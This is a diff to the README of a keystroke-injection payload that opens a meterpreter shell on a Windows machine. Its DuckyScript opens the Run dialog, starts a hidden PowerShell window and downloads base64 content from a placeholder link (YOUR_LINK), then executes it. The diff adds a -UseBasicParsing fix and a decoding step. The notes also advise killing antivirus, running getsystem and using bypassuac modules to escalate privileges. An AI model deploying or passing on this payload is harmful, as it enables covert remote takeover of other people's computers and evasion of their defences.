@@ -9,6 +9,8 @@ You can URL shorten it if you'd like, just make sure you use the raw link and no
 
 * NOTE: It is recommended you migrate the shell and kill antivirus as soon as possible, as most antiviruses will pick up on a meterpreter shell and kill it. Running ```getsystem``` command on meterpreter is also great. Use the windows/local/bypassuac modules (find them with the command ```search bypassuac```, I find that ```exploit/windows/local/bypassuac_injection_winsxs``` works very well for my Windows 10 device, disabled antivirus of course!) for Windows 8 and up. This will allow you to bypass the UAC on windows, any level, and be able to freely run the ```getsystem``` command, which essentially lets you do anything.
 
+* EDIT (28/09/2021): Using ```-UseBasicParsing``` you can fix a fatal error who happens when the target has not the Internet Explorer parser installed but you have to decode the response because is a ByteArray.
+
 ```
 REM Opens a meterpreter using a pastebin link
 REM See https://github.com/hak5/bashbunny-payloads/blob/master/payloads/library/remote_access/SingleSecondShell/readme.md
@@ -16,7 +18,7 @@ REM For how to create a link to your personal shellcode
 DELAY 2000
 GUI r
 DELAY 1000
-STRING powershell -windowstyle hidden $u='YOUR_LINK';$r=Invoke-WebRequest -Uri $u;powershell -nop -e $r.content
+STRING powershell -windowstyle hidden $u='YOUR_LINK';$r=Invoke-WebRequest -Uri $u -UseBasicParsing;$s=[System.Text.Encoding]::UTF8.GetString($r.Content);powershell -nop -e $s
 ENTER
 GUI r
 DELAY 1000
